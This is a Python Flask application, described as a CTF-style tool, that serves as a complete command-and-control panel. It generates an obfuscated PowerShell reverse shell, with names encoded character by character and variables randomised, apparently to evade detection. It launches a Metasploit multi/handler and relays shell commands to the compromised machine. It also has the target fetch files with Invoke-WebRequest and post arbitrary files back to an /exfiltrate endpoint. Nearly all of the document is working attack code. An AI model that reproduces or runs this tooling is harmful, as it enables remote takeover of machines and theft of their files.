#!/usr/bin/env python3
"""
Flask GUI for Metasploit multi/handler + obfuscated PowerShell payload generator.
Aggressive red neon design – CTF style, fully interactive.
"""

import subprocess
import signal
import os
import time
import random
import string
import threading
import re
import tempfile
from collections import deque
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────
#  Metasploit listener globals
# ─────────────────────────────────────────────────────────────────
msf_process = None
msf_master_fd = None

UPLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads')
os.makedirs(UPLOADS_DIR, exist_ok=True)
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

listener_status = {
    "running": False,
    "lhost": "0.0.0.0",
    "lport": 0,
    "payload": "generic/shell_reverse_tcp"
}

# Console output buffer (last 500 lines)
console_output = deque(maxlen=500)
console_lock = threading.Lock()

def strip_ansi(text):
    """Remove ANSI color codes from msfconsole output."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def read_msf_output():
    """Read msfconsole output in a background thread."""
    global msf_process
    if not msf_process:
        return
    try:
        for line in iter(msf_process.stdout.readline, ''):
            if line:
                clean_line = strip_ansi(line.rstrip())
                with console_lock:
                    console_output.append(clean_line)
    except:
        pass

# ----------------------------------------------------------------------
#  Obfuscated payload generator helpers (FIXED SYNTAX)
# ----------------------------------------------------------------------

def obf_char(ascii_code: int) -> str:
    """Return a small obfuscated expression that evaluates to the given ASCII code."""
    offset = random.randint(0, 50)
    return f"[char]({offset}+{ascii_code - offset})"

def obf_string_via_join(s: str) -> str:
    """Generate obfuscated expression that builds a string from ASCII codes."""
    codes = [ord(c) for c in s]
    code_list = ",".join(str(c) for c in codes)
    return f'([string]::join(\'\', ( ({code_list}) |%{{$_}}|ForEach-Object{{$_}}|%{{ ( [char][int] $_)}})) |%{{$_}}|ForEach-Object{{$_}}| % {{$_}})'

def random_var(length=8) -> str:
    """Generate a random variable name like $aBcDeFgH"""
    first = random.choice(string.ascii_letters)
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
    return f"${first}{rest}"

def generate_payload(ip: str, port: int) -> str:
    """Create heavily obfuscated PowerShell reverse shell with correct syntax."""
    
    # Strings to obfuscate
    str_new_object = "New-Object"
    str_tcpclient = "System.Net.Sockets.TCPClient"
    str_asciienc  = "System.Text.ASCIIEncoding"
    str_iex       = "Invoke-Expression"
    str_out_string = "Out-String"
    str_get_loc    = "Get-Location"

    # Build obfuscated expressions
    obf_new_object = obf_string_via_join(str_new_object)
    obf_tcpclient  = obf_string_via_join(str_tcpclient)
    obf_asciienc   = obf_string_via_join(str_asciienc)
    obf_iex        = obf_string_via_join(str_iex)
    obf_out_string = obf_string_via_join(str_out_string)
    obf_get_loc    = obf_string_via_join(str_get_loc)

    # Obfuscate IP and port as strings
    def obf_string_as_args(s: str) -> str:
        """Build obfuscated string like $([char]... + [char]... + ...)"""
        parts = []
        for ch in s:
            parts.append(obf_char(ord(ch)))
        return '$(' + '+'.join(parts) + ')'

    obf_ip   = obf_string_as_args(ip)
    obf_port = obf_string_as_args(str(port))

    # Random variables
    var_client = random_var(12)
    var_stream = random_var(10)
    var_buf    = random_var(8)
    var_read   = random_var(8)
    var_data   = random_var(8)
    var_result = random_var(8)
    var_prompt = random_var(8)
    var_send   = random_var(6)

    # FIXED: correct PowerShell variable syntax, no triple braces
    payload = f"""\
{var_client} = & {obf_new_object} {obf_tcpclient}({obf_ip}, {obf_port});
{var_stream} = {var_client}.GetStream();
[byte[]]{var_buf} = 0..65535|%{{$_}}|%{{0}};
while(({var_read} = {var_stream}.Read({var_buf}, 0, {var_buf}.Length)) -ne 0){{
    {var_data} = (& {obf_new_object} -TypeName {obf_asciienc}).GetString({var_buf},0, {var_read});
    {var_result} = (& {obf_iex} {var_data} 2>&1 |%{{$_}}| & {obf_out_string} );
    {var_prompt} = {var_result} + 'PS ' + (& {obf_get_loc}).Path + '> ';
    {var_send} = ([text.encoding]::ASCII).GetBytes({var_prompt});
    {var_stream}.Write({var_send},0,{var_send}.Length);
    {var_stream}.Flush();
}};
{var_client}.Close();
""".rstrip()

    return payload

# ----------------------------------------------------------------------
#  Flask routes
# ----------------------------------------------------------------------

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>🔥 NEOHANDLER | Payload + Listener</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: radial-gradient(circle at 20% 30%, #0a0000, #000000);
    color: #ff4444;
    font-family: 'Share Tech Mono', monospace;
    height: 100vh;
    overflow: hidden;
    position: relative;
  }

  /* CRT scanlines + glow */
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(255,0,0,0.03) 2px, transparent 2px, transparent 6px);
    pointer-events: none;
    z-index: 10;
  }

  body::after {
    content: "";
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    box-shadow: inset 0 0 100px rgba(255,0,0,0.2), 0 0 50px rgba(255,0,0,0.1);
    pointer-events: none;
    z-index: 10;
  }

  #app {
    display: flex;
    flex-direction: column;
    height: 100vh;
    position: relative;
    z-index: 2;
    backdrop-filter: blur(0.3px);
  }

  /* HEADER – aggressive neon */
  header {
    background: linear-gradient(90deg, #1a0000, #2a0000, #1a0000);
    border-bottom: 2px solid #ff0000;
    box-shadow: 0 0 25px rgba(255,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
    padding: 12px 24px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .logo {
    font-family: 'Orbitron', monospace;
    font-size: 22px;
    font-weight: 900;
    letter-spacing: 4px;
    text-shadow: 0 0 8px #ff0000, 0 0 18px #ff0000;
    background: linear-gradient(135deg, #ff4444, #ff0000);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }

  .status-area {
    display: flex;
    align-items: center;
    gap: 12px;
    background: #0a0000aa;
    padding: 6px 16px;
    border-radius: 40px;
    border: 1px solid #ff000044;
  }

  .status-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #660000;
    transition: all 0.2s;
    box-shadow: 0 0 5px currentColor;
  }

  .status-dot.active {
    background: #ff3300;
    box-shadow: 0 0 12px #ff3300, 0 0 20px #ff0000;
    animation: pulse 1s infinite;
  }

  .status-dot.running {
    background: #ffaa00;
    box-shadow: 0 0 15px #ffaa00;
    animation: blink 0.8s step-end infinite;
  }

  @keyframes pulse {
    0% { opacity: 0.6; transform: scale(1); }
    100% { opacity: 1; transform: scale(1.1); }
  }
  @keyframes blink {
    50% { opacity: 0.3; }
  }

  main {
    flex: 1;
    overflow-y: auto;
    padding: 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
  }

  /* Cards – glassmorphism with red border */
  .card {
    background: rgba(10, 0, 0, 0.75);
    backdrop-filter: blur(3px);
    border: 1px solid #ff000044;
    border-left: 4px solid #ff0000;
    border-radius: 12px;
    width: 100%;
    max-width: 750px;
    padding: 20px;
    box-shadow: 0 8px 32px rgba(255,0,0,0.2);
    transition: all 0.2s;
  }

  .card:hover {
    border-left-width: 6px;
    border-color: #ff4444;
    box-shadow: 0 0 20px rgba(255,0,0,0.4);
  }

  .card-title {
    font-family: 'Orbitron', monospace;
    font-size: 13px;
    letter-spacing: 3px;
    text-transform: uppercase;
    color: #ff7777;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px dashed #ff000066;
    padding-bottom: 6px;
  }

  label {
    display: block;
    font-size: 10px;
    letter-spacing: 1.5px;
    color: #ff8888;
    margin-top: 12px;
    margin-bottom: 4px;
    text-transform: uppercase;
  }

  input, textarea {
    width: 100%;
    background: #0f0000;
    border: 1px solid #ff000066;
    color: #ffcccc;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    padding: 8px 12px;
    border-radius: 6px;
    outline: none;
    transition: 0.2s;
  }

  input:focus, textarea:focus {
    border-color: #ff4444;
    box-shadow: 0 0 10px #ff0000;
    background: #1a0000;
  }

  .btn-row {
    display: flex;
    gap: 12px;
    margin-top: 20px;
  }

  .btn {
    flex: 1;
    background: none;
    border: 1.5px solid #ff0000;
    color: #ff6666;
    font-family: 'Orbitron', monospace;
    font-size: 11px;
    font-weight: bold;
    letter-spacing: 2px;
    padding: 8px 0;
    border-radius: 40px;
    cursor: pointer;
    text-transform: uppercase;
    transition: 0.2s;
    backdrop-filter: blur(5px);
  }

  .btn-red {
    background: linear-gradient(90deg, #ff000022, #ff000011);
    text-shadow: 0 0 3px red;
  }

  .btn-red:hover {
    background: #ff0000aa;
    color: black;
    border-color: #ff8888;
    box-shadow: 0 0 18px #ff0000;
    transform: scale(1.02);
  }

  .btn-ghost {
    border-color: #aa5555;
    color: #ff9999;
  }

  .btn-ghost:hover {
    border-color: #ff0000;
    color: #ff0000;
    box-shadow: 0 0 8px #ff0000;
  }

  .btn:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    filter: grayscale(0.3);
  }

  .copy-btn {
    background: #2a0000;
    border: 1px solid #ff6666;
    color: #ff9999;
    font-size: 10px;
    padding: 4px 10px;
    border-radius: 20px;
    cursor: pointer;
    transition: 0.1s;
  }

  .copy-btn:hover {
    background: #ff0000;
    color: black;
    border-color: white;
    box-shadow: 0 0 10px red;
  }

  .info-line {
    display: flex;
    justify-content: space-between;
    font-size: 12px;
    padding: 4px 0;
    border-bottom: 1px dotted #ff000033;
  }

  .info-line span:first-child {
    color: #ff8888;
  }
  .info-line span:last-child {
    color: #ff3333;
    font-weight: bold;
    text-shadow: 0 0 4px red;
  }

  .console {
    background: #020000;
    border: 1px solid #ff0000;
    border-radius: 8px;
    padding: 10px;
    height: 180px;
    overflow-y: auto;
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    color: #ffaaaa;
    white-space: pre-wrap;
    word-break: break-all;
    box-shadow: inset 0 0 20px rgba(255,0,0,0.2);
  }

  textarea {
    min-height: 200px;
    resize: vertical;
  }

  ::-webkit-scrollbar {
    width: 6px;
    background: #1a0000;
  }
  ::-webkit-scrollbar-thumb {
    background: #ff0000;
    border-radius: 4px;
  }
</style>
</head>
<body>
<div id="app">
  <header>
    <div class="logo">⚡ NEOHANDLER ⚡</div>
    <div class="status-area">
      <span class="status-dot" id="status-dot"></span>
      <span id="status-text">STANDBY</span>
    </div>
  </header>
  <main>
    <div class="card">
      <div class="card-title">🔥 TARGET CONFIG</div>
      <label>LHOST (bind IP)</label>
      <input id="lhost" type="text" value="0.0.0.0" placeholder="0.0.0.0"/>
      <label>LPORT</label>
      <input id="port" type="number" value="4444" min="1" max="65535"/>
      <div class="btn-row">
        <button class="btn btn-red" id="btn-generate">☠ GENERATE PAYLOAD</button>
        <button class="btn btn-red" id="btn-start">▶ START LISTENER</button>
        <button class="btn btn-ghost" id="btn-stop" disabled>■ STOP</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title" style="justify-content: space-between;">
        <span>📜 OBFUSCATED POWERSHELL</span>
        <button class="copy-btn" id="btn-copy">COPY</button>
      </div>
      <textarea id="payload-out" readonly placeholder="Click GENERATE..."></textarea>
    </div>

    <div class="card">
      <div class="card-title">📡 LISTENER STATUS & SHELL</div>
      <div class="info-line"><span>LHOST</span><span id="info-lhost">--</span></div>
      <div class="info-line"><span>LPORT</span><span id="info-lport">--</span></div>
      <div class="info-line"><span>PAYLOAD</span><span id="info-payload">--</span></div>
      <div class="info-line"><span>STATE</span><span id="info-state">OFFLINE</span></div>
      <label style="margin-top: 12px;">SHELL OUTPUT</label>
      <div class="console" id="console" style="height: 300px;">[system] Ready for action.</div>
      <div class="btn-row" style="margin-top: 10px;">
        <input id="shell-input" type="text" placeholder="Type command here..." style="flex:3; margin:0;" autocomplete="off" />
        <button class="btn btn-red" id="btn-send-cmd" style="flex:1; margin:0 0 0 8px;">SEND (Enter)</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title">📂 METASPLOIT FILE TRANSFER</div>
      <div style="display:flex; gap:20px; flex-wrap:wrap;">
        <div style="flex:1; min-width: 300px;">
          <label>UPLOAD TO TARGET</label>
          <input type="file" id="upload-file" style="margin-bottom:8px; background:transparent; padding:0; border:none;" />
          <button class="btn btn-red" id="btn-upload" style="width:100%;">UPLOAD TO TARGET</button>
        </div>
        <div style="flex:1; min-width: 300px;">
          <label>DOWNLOAD FROM TARGET (Remote Path)</label>
          <input type="text" id="download-path" placeholder="C:\\Users\\Public\\secret.txt" style="margin-bottom:8px;" />
          <button class="btn btn-ghost" id="btn-download" style="width:100%;">DOWNLOAD FROM TARGET</button>
        </div>
      </div>
      <label style="margin-top:20px;">LOCAL DOWNLOADS (Exfiltrated)</label>
      <div id="downloads-list" style="background:#0a0000; padding:10px; border:1px solid #ff000044; min-height:50px; font-size:12px; margin-bottom:8px;">
        <!-- downloaded files listed here -->
      </div>
      <button class="btn btn-ghost" id="btn-refresh-dl" style="width:100%;">REFRESH DOWNLOADS</button>
    </div>
  </main>
</div>

<script>
  const $ = s => document.querySelector(s);
  let logOffset = 0;

  function log(msg) {
    const c = $('#console');
    c.textContent += '\\n' + msg;
    c.scrollTop = c.scrollHeight;
  }

  async function copyText(text) {
    try { await navigator.clipboard.writeText(text); }
    catch { /* fallback */ }
  }

  async function pollLogs() {
    try {
      const resp = await fetch(`/listener/logs?offset=${logOffset}`);
      const data = await resp.json();
      if(data.logs && data.logs.length) {
        data.logs.forEach(line => log(line));
        logOffset += data.logs.length;
      }
      if(document.getElementById('status-dot').classList.contains('active')) {
        setTimeout(pollLogs, 1200);
      }
    } catch(e) {}
  }

  // Generate payload
  $('#btn-generate').addEventListener('click', async () => {
    const lhost = $('#lhost').value.trim() || '0.0.0.0';
    const port = $('#port').value;
    try {
      const resp = await fetch('/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: lhost, port: parseInt(port) })
      });
      const data = await resp.json();
      if(data.payload) {
        $('#payload-out').value = data.payload;
        log(`[+] Payload generated for ${lhost}:${port}`);
      } else {
        log(`[-] Error: ${data.error}`);
      }
    } catch(e) { log(`[!] ${e.message}`); }
  });

  $('#btn-copy').addEventListener('click', () => {
    const txt = $('#payload-out').value;
    if(txt) copyText(txt);
  });

  // Start listener
  $('#btn-start').addEventListener('click', async () => {
    const lhost = $('#lhost').value.trim() || '0.0.0.0';
    const port = $('#port').value;
    $('#btn-start').disabled = true;
    $('#btn-stop').disabled = false;
    $('#status-dot').className = 'status-dot running';
    $('#status-text').innerText = 'STARTING';
    try {
      const resp = await fetch('/listener/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lhost: lhost, lport: parseInt(port) })
      });
      const data = await resp.json();
      if(data.success) {
        $('#status-dot').className = 'status-dot active';
        $('#status-text').innerText = 'RUNNING';
        $('#info-lhost').innerText = data.lhost;
        $('#info-lport').innerText = data.lport;
        $('#info-payload').innerText = data.payload;
        $('#info-state').innerHTML = '<span style="color:#ff5500; text-shadow:0 0 5px red;">ACTIVE</span>';
        log(`[+] Handler started on ${data.lhost}:${data.lport}`);
        pollLogs();
      } else {
        throw new Error(data.error);
      }
    } catch(e) {
      $('#status-dot').className = 'status-dot';
      $('#status-text').innerText = 'ERROR';
      $('#btn-start').disabled = false;
      $('#btn-stop').disabled = true;
      log(`[-] Start failed: ${e.message}`);
    }
  });

  // Shell send
  $('#btn-send-cmd').addEventListener('click', async () => {
    const cmd = $('#shell-input').value;
    if(!cmd) return;
    try {
      await fetch('/listener/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd })
      });
      $('#shell-input').value = '';
    } catch(e) { log(`[-] Error sending cmd: ${e.message}`); }
  });
  
  $('#shell-input').addEventListener('keypress', (e) => {
    if(e.key === 'Enter') $('#btn-send-cmd').click();
  });

  // Upload to target
  $('#btn-upload').addEventListener('click', async () => {
    const fileInput = $('#upload-file');
    if(!fileInput.files.length) return log("[-] No file selected");
    const file = fileInput.files[0];
    const formData = new FormData();
    formData.append('file', file);
    log(`[*] Uploading ${file.name} to Flask server...`);
    try {
      const resp = await fetch('/upload_to_flask', { method: 'POST', body: formData });
      const data = await resp.json();
      if(data.success) {
        log(`[+] File saved on Flask as ${data.filename}`);
        const flaskIp = window.location.hostname;
        const flaskPort = window.location.port;
        const url = `http://${flaskIp}:${flaskPort}/uploads/${data.filename}`;
        const psCmd = `Invoke-WebRequest -Uri "${url}" -OutFile "${data.filename}"`;
        log(`[*] Sending command to target: ${psCmd}`);
        await fetch('/listener/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: psCmd })
        });
        log(`[+] Upload command sent.`);
        fileInput.value = '';
      } else {
        log(`[-] Upload failed: ${data.error}`);
      }
    } catch(e) { log(`[-] Upload error: ${e.message}`); }
  });

  // Download from target
  $('#btn-download').addEventListener('click', async () => {
    const remotePath = $('#download-path').value.trim();
    if(!remotePath) return log("[-] No remote path provided");
    const filename = remotePath.split('\\\\').pop().split('/').pop();
    const flaskIp = window.location.hostname;
    const flaskPort = window.location.port;
    const url = `http://${flaskIp}:${flaskPort}/exfiltrate?filename=${filename}`;
    const psCmd = `Invoke-RestMethod -Uri "${url}" -Method Post -InFile "${remotePath}"`;
    log(`[*] Sending command to target: ${psCmd}`);
    try {
      await fetch('/listener/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: psCmd })
      });
      log(`[+] Download command sent. Wait a moment and refresh local downloads.`);
      $('#download-path').value = '';
    } catch(e) { log(`[-] Download error: ${e.message}`); }
  });

  // Refresh downloads
  async function refreshDownloads() {
    try {
      const resp = await fetch('/downloads_list');
      const data = await resp.json();
      const list = $('#downloads-list');
      list.innerHTML = '';
      if(data.files && data.files.length) {
        data.files.forEach(f => {
          const a = document.createElement('a');
          a.href = `/downloads/${f}`;
          a.innerText = f;
          a.target = '_blank';
          a.download = f;
          a.style.color = '#ff4444';
          a.style.display = 'block';
          a.style.marginBottom = '4px';
          list.appendChild(a);
        });
      } else {
        list.innerText = 'No files downloaded yet.';
      }
    } catch(e) {}
  }
  $('#btn-refresh-dl').addEventListener('click', refreshDownloads);
  refreshDownloads();

  // Stop listener
  $('#btn-stop').addEventListener('click', async () => {
    try {
      const resp = await fetch('/listener/stop', { method: 'POST' });
      const data = await resp.json();
      if(data.success) {
        $('#status-dot').className = 'status-dot';
        $('#status-text').innerText = 'STOPPED';
        $('#btn-start').disabled = false;
        $('#btn-stop').disabled = true;
        $('#info-state').innerHTML = 'OFFLINE';
        log('[+] Listener terminated');
      }
    } catch(e) { log(`[!] ${e.message}`); }
  });

  // initial status fetch
  window.onload = async () => {
    try {
      const r = await fetch('/listener/status');
      const d = await r.json();
      if(d.running) {
        $('#status-dot').className = 'status-dot active';
        $('#status-text').innerText = 'RUNNING';
        $('#btn-start').disabled = true;
        $('#btn-stop').disabled = false;
        $('#info-lhost').innerText = d.lhost;
        $('#info-lport').innerText = d.lport;
        $('#info-payload').innerText = d.payload;
        $('#info-state').innerHTML = '<span style="color:#ff5500; text-shadow:0 0 5px red;">ACTIVE</span>';
        pollLogs();
      }
    } catch(e) {}
  };
</script>
</body>
</html>
"""

# ----------------------------------------------------------------------
#  Routes
# ----------------------------------------------------------------------

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/generate', methods=['POST'])
def generate():
    data = request.get_json()
    ip = data.get('ip', '').strip()
    try:
        port = int(data.get('port', 0))
    except (ValueError, TypeError):
        return jsonify({"error": "Invalid port"}), 400
    if not ip or not (1 <= port <= 65535):
        return jsonify({"error": "IP and valid port required"}), 400
    payload = generate_payload(ip, port)
    return jsonify({"payload": payload})

@app.route('/listener/start', methods=['POST'])
def start_listener():
    global msf_process, listener_status
    if listener_status["running"]:
        return jsonify({"success": False, "error": "Already running"})
    data = request.get_json()
    lhost = data.get('lhost', '0.0.0.0').strip()
    port = data.get('lport')
    if not port:
        return jsonify({"success": False, "error": "Port required"})
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        return jsonify({"success": False, "error": "Invalid port"})

    payload = "generic/shell_reverse_tcp"
    
    # Resource script – exactly as manual: use multi/handler, set options, exploit -j, keep alive
    resource_script = f"""
use multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {port}
set ExitOnSession false
exploit -j
"""
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(resource_script)
            rc_file = f.name
        
        import pty
        master, slave = pty.openpty()
        global msf_master_fd
        msf_master_fd = master
        msf_process = subprocess.Popen(
            ["msfconsole", "-q", "-r", rc_file],
            stdin=slave,
            stdout=slave,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            close_fds=True
        )
        os.close(slave)
        
        def read_msf_pty(fd):
            with os.fdopen(fd, 'r') as f:
                for line in iter(f.readline, ''):
                    if line:
                        clean_line = strip_ansi(line.rstrip())
                        with console_lock:
                            console_output.append(clean_line)

        threading.Thread(target=read_msf_pty, args=(master,), daemon=True).start()
        time.sleep(2)
        if msf_process.poll() is not None:
            raise RuntimeError("msfconsole exited unexpectedly")
        
        listener_status["running"] = True
        listener_status["lhost"] = lhost
        listener_status["lport"] = port
        listener_status["payload"] = payload
        
        with console_lock:
            console_output.append(f"[+] multi/handler started on {lhost}:{port}")
        return jsonify({"success": True, "lhost": lhost, "lport": port, "payload": payload})
    except Exception as e:
        msf_process = None
        return jsonify({"success": False, "error": str(e)})

@app.route('/listener/stop', methods=['POST'])
def stop_listener():
    global msf_process, listener_status, msf_master_fd
    if not listener_status["running"]:
        return jsonify({"success": False, "error": "Not running"})
    if msf_process and msf_process.poll() is None:
        try:
            msf_process.send_signal(signal.SIGINT)
            msf_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            msf_process.kill()
    msf_process = None
    if msf_master_fd is not None:
        try: os.close(msf_master_fd)
        except: pass
        msf_master_fd = None
    listener_status["running"] = False
    with console_lock:
        console_output.append("[*] Handler stopped")
    return jsonify({"success": True, "message": "Listener stopped"})

@app.route('/listener/status')
def listener_status_route():
    return jsonify(listener_status)

@app.route('/listener/logs')
def listener_logs():
    offset = int(request.args.get('offset', 0))
    with console_lock:
        logs = list(console_output)[offset:]
    return jsonify({"logs": logs})

@app.route('/listener/send', methods=['POST'])
def listener_send():
    global msf_master_fd, msf_process
    if not listener_status["running"] or msf_master_fd is None:
        return jsonify({"success": False, "error": "Not running"})
    data = request.get_json()
    cmd = data.get('command', '')
    try:
        os.write(msf_master_fd, (cmd + '\n').encode())
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/upload_to_flask', methods=['POST'])
def upload_to_flask():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file provided"})
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"})
    filename = secure_filename(file.filename)
    file.save(os.path.join(UPLOADS_DIR, filename))
    return jsonify({"success": True, "filename": filename})

@app.route('/uploads/<filename>')
def serve_upload(filename):
    return send_from_directory(UPLOADS_DIR, filename)

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    # Receive file from target
    if 'file' in request.files:
        file = request.files['file']
        filename = secure_filename(file.filename)
        file.save(os.path.join(DOWNLOADS_DIR, filename))
        return "OK"
    elif request.data:
        # Sometimes Invoke-RestMethod just posts raw body
        filename = secure_filename(request.args.get('filename', f"exfil_{int(time.time())}.bin"))
        with open(os.path.join(DOWNLOADS_DIR, filename), 'wb') as f:
            f.write(request.data)
        return "OK"
    else:
        return "No data", 400

@app.route('/downloads_list')
def list_downloads():
    files = os.listdir(DOWNLOADS_DIR)
    return jsonify({"files": files})

@app.route('/downloads/<filename>')
def serve_download(filename):
    return send_from_directory(DOWNLOADS_DIR, filename)

def cleanup():
    global msf_process, msf_master_fd
    if msf_process and msf_process.poll() is None:
        msf_process.send_signal(signal.SIGINT)
        try:
            msf_process.wait(timeout=3)
        except:
            msf_process.kill()
    if msf_master_fd is not None:
        try: os.close(msf_master_fd)
        except: pass

if __name__ == '__main__':
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    finally:
        cleanup()